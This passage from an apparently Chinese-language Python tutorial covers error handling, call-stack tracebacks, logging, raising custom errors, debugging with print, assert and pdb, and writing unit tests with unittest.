print(&#x27;finally...&#x27;)</span><br></pre></td></tr></table></figure><p>也就是说，不需要在每个可能出错的地方去捕获错误，只要在合适的层次去捕获错误就可以了。这样一来，就大大减少了写<code>try...except...finally</code>的麻烦。</p><h3 id="8-1-2-调用栈"><a href="#8-1-2-调用栈" class="headerlink" title="8.1.2 调用栈"></a>8.1.2 调用栈</h3><p>如果错误没有被捕获，它就会一直往上抛，最后被Python解释器捕获，打印一个错误信息，然后程序退出。来看看<code>err.py</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># err.py:</span><br><span class="line">def foo(s):</span><br><span class="line">    return 10 / int(s)</span><br><span class="line"></span><br><span class="line">def bar(s):</span><br><span class="line">    return foo(s) * 2</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    bar(&#x27;0&#x27;)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>执行，结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python3 err.py</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;err.py&quot;, line 11, in &lt;module&gt;</span><br><span class="line">    main()</span><br><span class="line">  File &quot;err.py&quot;, line 9, in main</span><br><span class="line">    bar(&#x27;0&#x27;)</span><br><span class="line">  File &quot;err.py&quot;, line 6, in bar</span><br><span class="line">    return foo(s) * 2</span><br><span class="line">  File &quot;err.py&quot;, line 3, in foo</span><br><span class="line">    return 10 / int(s)</span><br><span class="line">ZeroDivisionError: division by zero</span><br></pre></td></tr></table></figure><p>出错并不可怕，可怕的是不知道哪里出错了。解读错误信息是定位错误的关键。我们从上往下可以看到整个错误的调用函数链：</p><p>错误信息第1行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br></pre></td></tr></table></figure><p>告诉我们这是错误的跟踪信息。</p><p>第2~3行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File &quot;err.py&quot;, line 11, in &lt;module&gt;</span><br><span class="line">   main()</span><br></pre></td></tr></table></figure><p>调用<code>main()</code>出错了，在代码文件<code>err.py</code>的第11行代码，但原因是第9行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File &quot;err.py&quot;, line 9, in main</span><br><span class="line">   bar(&#x27;0&#x27;)</span><br></pre></td></tr></table></figure><p>调用<code>bar(&#39;0&#39;)</code>出错了，在代码文件<code>err.py</code>的第9行代码，但原因是第6行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File &quot;err.py&quot;, line 6, in bar</span><br><span class="line">    return foo(s) * 2</span><br></pre></td></tr></table></figure><p>原因是<code>return foo(s) * 2</code>这个语句出错了，但这还不是最终原因，继续往下看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File &quot;err.py&quot;, line 3, in foo</span><br><span class="line">    return 10 / int(s)</span><br></pre></td></tr></table></figure><p>原因是<code>return 10 / int(s)</code>这个语句出错了，这是错误产生的源头，因为下面打印了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZeroDivisionError: integer division or modulo by zero</span><br></pre></td></tr></table></figure><p>根据错误类型<code>ZeroDivisionError</code>，我们判断，<code>int(s)</code>本身并没有出错，但是<code>int(s)</code>返回<code>0</code>，在计算<code>10 / 0</code>时出错，至此，找到错误源头。</p><p>!&gt; 出错的时候，一定要分析错误的调用栈信息，才能定位错误的位置。</p><p><img src="https://cos.gjcloak.xyz/images/01/20200817150626.png" alt="异常栈" title="异常栈"></p><h3 id="8-1-3-记录错误"><a href="#8-1-3-记录错误" class="headerlink" title="8.1.3 记录错误"></a>8.1.3 记录错误</h3><p>如果不捕获错误，自然可以让Python解释器来打印出错误堆栈，但程序也被结束了。既然我们能捕获错误，就可以把错误堆栈打印出来，然后分析错误原因，同时，让程序继续执行下去。</p><p>Python内置的<code>logging</code>模块可以非常容易地记录错误信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># err_logging.py</span><br><span class="line"></span><br><span class="line">import logging</span><br><span class="line"></span><br><span class="line">def foo(s):</span><br><span class="line">    return 10 / int(s)</span><br><span class="line"></span><br><span class="line">def bar(s):</span><br><span class="line">    return foo(s) * 2</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    try:</span><br><span class="line">        bar(&#x27;0&#x27;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        logging.exception(e)</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">print(&#x27;END&#x27;)</span><br></pre></td></tr></table></figure><p>同样是出错，但程序打印完错误信息后会继续执行，并正常退出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python3 err_logging.py</span><br><span class="line">ERROR:root:division by zero</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;err_logging.py&quot;, line 13, in main</span><br><span class="line">    bar(&#x27;0&#x27;)</span><br><span class="line">  File &quot;err_logging.py&quot;, line 9, in bar</span><br><span class="line">    return foo(s) * 2</span><br><span class="line">  File &quot;err_logging.py&quot;, line 6, in foo</span><br><span class="line">    return 10 / int(s)</span><br><span class="line">ZeroDivisionError: division by zero</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>通过配置，<code>logging</code>还可以把错误记录到日志文件里，方便事后排查。</p><h3 id="8-1-4-抛出错误"><a href="#8-1-4-抛出错误" class="headerlink" title="8.1.4 抛出错误"></a>8.1.4 抛出错误</h3><p>因为错误是class，捕获一个错误就是捕获到该class的一个实例。因此，错误并不是凭空产生的，而是有意创建并抛出的。Python的内置函数会抛出很多类型的错误，我们自己编写的函数也可以抛出错误。</p><p>如果要抛出错误，首先根据需要，可以定义一个错误的class，选择好继承关系，然后，用<code>raise</code>语句抛出一个错误的实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># err_raise.py</span><br><span class="line">class FooError(ValueError):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def foo(s):</span><br><span class="line">    n = int(s)</span><br><span class="line">    if n==0:</span><br><span class="line">        raise FooError(&#x27;invalid value: %s&#x27; % s)</span><br><span class="line">    return 10 / n</span><br><span class="line"></span><br><span class="line">foo(&#x27;0&#x27;)</span><br></pre></td></tr></table></figure><p>执行，可以最后跟踪到我们自己定义的错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python3 err_raise.py </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;err_throw.py&quot;, line 11, in &lt;module&gt;</span><br><span class="line">    foo(&#x27;0&#x27;)</span><br><span class="line">  File &quot;err_throw.py&quot;, line 8, in foo</span><br><span class="line">    raise FooError(&#x27;invalid value: %s&#x27; % s)</span><br><span class="line">__main__.FooError: invalid value: 0</span><br></pre></td></tr></table></figure><p>只有在必要的时候才定义我们自己的错误类型。如果可以选择Python已有的内置的错误类型（比如<code>ValueError</code>，<code>TypeError</code>），尽量使用Python内置的错误类型。</p><p>最后，我们来看另一种错误处理的方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># err_reraise.py</span><br><span class="line"></span><br><span class="line">def foo(s):</span><br><span class="line">    n = int(s)</span><br><span class="line">    if n==0:</span><br><span class="line">        raise ValueError(&#x27;invalid value: %s&#x27; % s)</span><br><span class="line">    return 10 / n</span><br><span class="line"></span><br><span class="line">def bar():</span><br><span class="line">    try:</span><br><span class="line">        foo(&#x27;0&#x27;)</span><br><span class="line">    except ValueError as e:</span><br><span class="line">        print(&#x27;ValueError!&#x27;)</span><br><span class="line">        raise</span><br><span class="line"></span><br><span class="line">bar()</span><br></pre></td></tr></table></figure><p>在<code>bar()</code>函数中，我们明明已经捕获了错误，但是，打印一个<code>ValueError!</code>后，又把错误通过<code>raise</code>语句抛出去了，这不有病么？</p><p>其实这种错误处理方式不但没病，而且相当常见。捕获错误目的只是记录一下，便于后续追踪。但是，由于当前函数不知道应该怎么处理该错误，所以，最恰当的方式是继续往上抛，让顶层调用者去处理。好比一个员工处理不了一个问题时，就把问题抛给他的老板，如果他的老板也处理不了，就一直往上抛，最终会抛给CEO去处理。</p><p><code>raise</code>语句如果不带参数，就会把当前错误原样抛出。此外，在<code>except</code>中<code>raise</code>一个Error，还可以把一种类型的错误转化成另一种类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    10 / 0</span><br><span class="line">except ZeroDivisionError:</span><br><span class="line">    raise ValueError(&#x27;input error!&#x27;)</span><br></pre></td></tr></table></figure><p>只要是合理的转换逻辑就可以，但是，决不应该把一个<code>IOError</code>转换成毫不相干的<code>ValueError</code>。</p><blockquote><p>小结：</p></blockquote><p>Python内置的<code>try...except...finally</code>用来处理错误十分方便。出错时，会分析错误信息并定位错误发生的代码位置才是最关键的。</p><p>程序也可以主动抛出错误，让调用者来处理相应的错误。但是，应该在文档中写清楚可能会抛出哪些错误，以及错误产生的原因。</p><h2 id="8-2-调试"><a href="#8-2-调试" class="headerlink" title="8.2 调试"></a>8.2 调试</h2><p>程序能一次写完并正常运行的概率很小，基本不超过1%。总会有各种各样的bug需要修正。有的bug很简单，看看错误信息就知道，有的bug很复杂，我们需要知道出错时，哪些变量的值是正确的，哪些变量的值是错误的，因此，需要一整套调试程序的手段来修复bug。</p><h3 id="8-2-1-print"><a href="#8-2-1-print" class="headerlink" title="8.2.1 print()"></a>8.2.1 print()</h3><p>第一种方法简单直接粗暴有效，就是用<code>print()</code>把可能有问题的变量打印出来看看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def foo(s):</span><br><span class="line">    n = int(s)</span><br><span class="line">    print(&#x27;&gt;&gt;&gt; n = %d&#x27; % n)</span><br><span class="line">    return 10 / n</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    foo(&#x27;0&#x27;)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>执行后在输出中查找打印的变量值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python err.py</span><br><span class="line">&gt;&gt;&gt; n = 0</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">ZeroDivisionError: integer division or modulo by zero</span><br></pre></td></tr></table></figure><p>用<code>print()</code>最大的坏处是将来还得删掉它，想想程序里到处都是<code>print()</code>，运行结果也会包含很多垃圾信息。所以，我们又有第二种方法。</p><h3 id="8-2-2-断言"><a href="#8-2-2-断言" class="headerlink" title="8.2.2 断言"></a>8.2.2 断言</h3><p>凡是用<code>print()</code>来辅助查看的地方，都可以用断言（assert）来替代：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def foo(s):</span><br><span class="line">    n = int(s)</span><br><span class="line">    assert n != 0, &#x27;n is zero!&#x27;</span><br><span class="line">    return 10 / n</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    foo(&#x27;0&#x27;)</span><br></pre></td></tr></table></figure><p><code>assert</code>的意思是，表达式<code>n != 0</code>应该是<code>True</code>，否则，根据程序运行的逻辑，后面的代码肯定会出错。</p><p>如果断言失败，<code>assert</code>语句本身就会抛出<code>AssertionError</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python err.py</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">AssertionError: n is zero!</span><br></pre></td></tr></table></figure><p>程序中如果到处充斥着<code>assert</code>，和<code>print()</code>相比也好不到哪去。不过，启动Python解释器时可以用<code>-O</code>参数来关闭<code>assert</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python -O err.py</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">ZeroDivisionError: division by zero</span><br></pre></td></tr></table></figure><p>!&gt; 注意：断言的开关“-O”是英文大写字母O，不是数字0。</p><p>关闭后，你可以把所有的<code>assert</code>语句当成<code>pass</code>来看。</p><h3 id="8-2-3-logging"><a href="#8-2-3-logging" class="headerlink" title="8.2.3 logging"></a>8.2.3 logging</h3><p>把<code>print()</code>替换为<code>logging</code>是第3种方式，和<code>assert</code>比，<code>logging</code>不会抛出错误，而且可以输出到文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import logging</span><br><span class="line"></span><br><span class="line">s = &#x27;0&#x27;</span><br><span class="line">n = int(s)</span><br><span class="line">logging.info(&#x27;n = %d&#x27; % n)</span><br><span class="line">print(10 / n)</span><br></pre></td></tr></table></figure><p><code>logging.info()</code>就可以输出一段文本。运行，发现除了<code>ZeroDivisionError</code>，没有任何信息。怎么回事？</p><p>别急，在<code>import logging</code>之后添加一行配置再试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import logging</span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br></pre></td></tr></table></figure><p>看到输出了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python err.py</span><br><span class="line">INFO:root:n = 0</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;err.py&quot;, line 8, in &lt;module&gt;</span><br><span class="line">    print(10 / n)</span><br><span class="line">ZeroDivisionError: division by zero</span><br></pre></td></tr></table></figure><p>这就是<code>logging</code>的好处，它允许你指定记录信息的级别，有<code>debug</code>，<code>info</code>，<code>warning</code>，<code>error</code>等几个级别，当我们指定<code>level=INFO</code>时，<code>logging.debug</code>就不起作用了。同理，指定<code>level=WARNING</code>后，<code>debug</code>和<code>info</code>就不起作用了。这样一来，你可以放心地输出不同级别的信息，也不用删除，最后统一控制输出哪个级别的信息。</p><p><code>logging</code>的另一个好处是通过简单的配置，一条语句可以同时输出到不同的地方，比如console和文件。</p><h3 id="8-2-4-pdb"><a href="#8-2-4-pdb" class="headerlink" title="8.2.4 pdb"></a>8.2.4 pdb</h3><p>第4种方式是启动Python的调试器pdb，让程序以单步方式运行，可以随时查看运行状态。我们先准备好程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># err.py</span><br><span class="line">s = &#x27;0&#x27;</span><br><span class="line">n = int(s)</span><br><span class="line">print(10 / n)</span><br></pre></td></tr></table></figure><p>然后启动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python -m pdb err.py</span><br><span class="line">&gt; /Users/michael/Github/learn-python3/samples/debug/err.py(2)&lt;module&gt;()</span><br><span class="line">-&gt; s = &#x27;0&#x27;</span><br></pre></td></tr></table></figure><p>以参数<code>-m pdb</code>启动后，pdb定位到下一步要执行的代码<code>-&gt; s = &#39;0&#39;</code>。输入命令<code>l</code>来查看代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) l</span><br><span class="line">  1     # err.py</span><br><span class="line">  2  -&gt; s = &#x27;0&#x27;</span><br><span class="line">  3     n = int(s)</span><br><span class="line">  4     print(10 / n)</span><br></pre></td></tr></table></figure><p>输入命令<code>n</code>可以单步执行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) n</span><br><span class="line">&gt; /Users/michael/Github/learn-python3/samples/debug/err.py(3)&lt;module&gt;()</span><br><span class="line">-&gt; n = int(s)</span><br><span class="line">(Pdb) n</span><br><span class="line">&gt; /Users/michael/Github/learn-python3/samples/debug/err.py(4)&lt;module&gt;()</span><br><span class="line">-&gt; print(10 / n)</span><br></pre></td></tr></table></figure><p>任何时候都可以输入命令<code>p 变量名</code>来查看变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) p s</span><br><span class="line">&#x27;0&#x27;</span><br><span class="line">(Pdb) p n</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>输入命令<code>q</code>结束调试，退出程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) q</span><br></pre></td></tr></table></figure><p>这种通过pdb在命令行调试的方法理论上是万能的，但实在是太麻烦了，如果有一千行代码，要运行到第999行得敲多少命令啊。还好，我们还有另一种调试方法。</p><h3 id="8-2-5-pdb-set-trace"><a href="#8-2-5-pdb-set-trace" class="headerlink" title="8.2.5 pdb.set_trace()"></a>8.2.5 pdb.set_trace()</h3><p>这个方法也是用pdb，但是不需要单步执行，我们只需要<code>import pdb</code>，然后，在可能出错的地方放一个<code>pdb.set_trace()</code>，就可以设置一个断点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># err.py</span><br><span class="line">import pdb</span><br><span class="line"></span><br><span class="line">s = &#x27;0&#x27;</span><br><span class="line">n = int(s)</span><br><span class="line">pdb.set_trace() # 运行到这里会自动暂停</span><br><span class="line">print(10 / n)</span><br></pre></td></tr></table></figure><p>运行代码，程序会自动在<code>pdb.set_trace()</code>暂停并进入pdb调试环境，可以用命令<code>p</code>查看变量，或者用命令<code>c</code>继续运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python err.py </span><br><span class="line">&gt; /Users/michael/Github/learn-python3/samples/debug/err.py(7)&lt;module&gt;()</span><br><span class="line">-&gt; print(10 / n)</span><br><span class="line">(Pdb) p n</span><br><span class="line">0</span><br><span class="line">(Pdb) c</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;err.py&quot;, line 7, in &lt;module&gt;</span><br><span class="line">    print(10 / n)</span><br><span class="line">ZeroDivisionError: division by zero</span><br></pre></td></tr></table></figure><p>这个方式比直接启动pdb单步调试效率要高很多，但也高不到哪去。</p><h3 id="8-2-6-IDE"><a href="#8-2-6-IDE" class="headerlink" title="8.2.6 IDE"></a>8.2.6 IDE</h3><p>如果要比较爽地设置断点、单步执行，就需要一个支持调试功能的IDE。目前比较好的Python IDE有：</p><ul><li>Visual Studio Code：<a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a>，需要安装Python插件。</li><li>PyCharm：<a href="http://www.jetbrains.com/pycharm/">http://www.jetbrains.com/pycharm/</a></li><li>另外，<a href="http://www.eclipse.org/">Eclipse</a>加上<a href="http://pydev.org/">pydev</a>插件也可以调试Python程序。</li></ul><blockquote><p>小结：</p></blockquote><p>写程序最痛苦的事情莫过于调试，程序往往会以你意想不到的流程来运行，你期待执行的语句其实根本没有执行，这时候，就需要调试了。</p><p>虽然用IDE调试起来比较方便，但是最后你会发现，logging才是终极武器。</p><h2 id="8-3-单元测试"><a href="#8-3-单元测试" class="headerlink" title="8.3 单元测试"></a>8.3 单元测试</h2><p>如果你听说过“测试驱动开发”（TDD：Test-Driven Development），单元测试就不陌生。</p><p>单元测试是用来对一个模块、一个函数或者一个类来进行正确性检验的测试工作。</p><p>比如对函数<code>abs()</code>，我们可以编写出以下几个测试用例：</p><ol><li>输入正数，比如<code>1</code>、<code>1.2</code>、<code>0.99</code>，期待返回值与输入相同；</li><li>输入负数，比如<code>-1</code>、<code>-1.2</code>、<code>-0.99</code>，期待返回值与输入相反；</li><li>输入<code>0</code>，期待返回<code>0</code>；</li><li>输入非数值类型，比如<code>None</code>、<code>[]</code>、<code>&#123;&#125;</code>，期待抛出<code>TypeError</code>。</li></ol><p>把上面的测试用例放到一个测试模块里，就是一个完整的单元测试。</p><p>如果单元测试通过，说明我们测试的这个函数能够正常工作。如果单元测试不通过，要么函数有bug，要么测试条件输入不正确，总之，需要修复使单元测试能够通过。</p><p>单元测试通过后有什么意义呢？如果我们对<code>abs()</code>函数代码做了修改，只需要再跑一遍单元测试，如果通过，说明我们的修改不会对<code>abs()</code>函数原有的行为造成影响，如果测试不通过，说明我们的修改与原有行为不一致，要么修改代码，要么修改测试。</p><p>这种以测试为驱动的开发模式最大的好处就是确保一个程序模块的行为符合我们设计的测试用例。在将来修改的时候，可以极大程度地保证该模块行为仍然是正确的。</p><p>我们来编写一个<code>Dict</code>类，这个类的行为和<code>dict</code>一致，但是可以通过属性来访问，用起来就像下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = Dict(a=1, b=2)</span><br><span class="line">&gt;&gt;&gt; d[&#x27;a&#x27;]</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; d.a</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p><code>mydict.py</code>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Dict(dict):</span><br><span class="line"></span><br><span class="line">    def __init__(self, **kw):</span><br><span class="line">        super().__init__(**kw)</span><br><span class="line"></span><br><span class="line">    def __getattr__(self, key):</span><br><span class="line">        try:</span><br><span class="line">            return self[key]</span><br><span class="line">        except KeyError:</span><br><span class="line">            raise AttributeError(r&quot;&#x27;Dict&#x27; object has no attribute &#x27;%s&#x27;&quot; % key)</span><br><span class="line"></span><br><span class="line">    def __setattr__(self, key, value):</span><br><span class="line">        self[key] = value</span><br></pre></td></tr></table></figure><p>为了编写单元测试，我们需要引入Python自带的<code>unittest</code>模块，编写<code>mydict_test.py</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import unittest</span><br><span class="line"></span><br><span class="line">from mydict import Dict</span><br><span class="line"></span><br><span class="line">class TestDict(unittest.TestCase):</span><br><span class="line"></span><br><span class="line">    def test_init(self):</span><br><span class="line">        d = Dict(a=1, b=&#x27;test&#x27;)</span><br><span class="line">        self.assertEqual(d.a, 1)</span><br><span class="line">        self.assertEqual(d.b, &#x27;test&#x27;)</span><br><span class="line">        self.assertTrue(isinstance(d, dict))</span><br><span class="line"></span><br><span class="line">    def test_key(self):</span><br><span class="line">        d = Dict()</span><br><span class="line">        d[&#x27;key&#x27;] = &#x27;value&#x27;</span><br><span class="line">        self.assertEqual(d.key, &#x27;value&#x27;)</span><br><span class="line"></span><br><span class="line">    def test_attr(self):</span><br><span class="line">        d = Dict()</span><br><span class="line">        d.key = &#x27;value&#x27;</span><br><span class="line">        self.assertTrue(&#x27;key&#x27; in d)</span><br><span class="line">        self.assertEqual(d[&#x27;key&#x27;], &#x27;value&#x27;)</span><br><span class="line"></span><br><span class="line">    def test_keyerror(self):</span><br><span class="line">        d = Dict()</span><br><span class="line">        with self.assertRaises(KeyError):</span><br><span class="line">            value = d[&#x27;empty&#x27;]</span><br><span class="line"></span><br><span class="line">    def test_attrerror(self):</span><br><span class="line">        d = Dict()</span><br><span class="line">        with self.assertRaises(AttributeError):</span><br><span class="line">            value = d.empty</span><br></pre></td></tr></table></figure><p>编写单元测试时，我们需要编写一个测试类，从<code>unittest.TestCase</code>继承。</p><p>以<code>test</code>开头的方法就是测试方法，不以<code>test</code>开头的方法不被认为是测试方法，测试的时候不会被执行。</p><p>对每一类测试都需要编写一个<code>test_xxx()</code>方法。由于<code>unittest.TestCase</code>提供了很多内置的条件判断，我们只需要调用这些方法就可以断言输出是否是我们所期望的。最常用的断言就是<code>assertEqual()</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.assertEqual(abs(-1), 1) # 断言函数返回的结果与1相等</span><br></pre></td></tr></table></figure><p>另一种重要的断言就是期待抛出指定类型的Error，比如通过<code>d[&#39;empty&#39;]</code>访问不存在的key时，断言会抛出<code>KeyError</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with self.assertRaises(KeyError):</span><br><span class="line">    value = d[&#x27;empty&#x27;]</span><br></pre></td></tr></table></figure><p>而通过<code>d.empty</code>访问不存在的key时，我们期待抛出<code>AttributeError</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with self.assertRaises(AttributeError):</span><br><span class="line">    value = 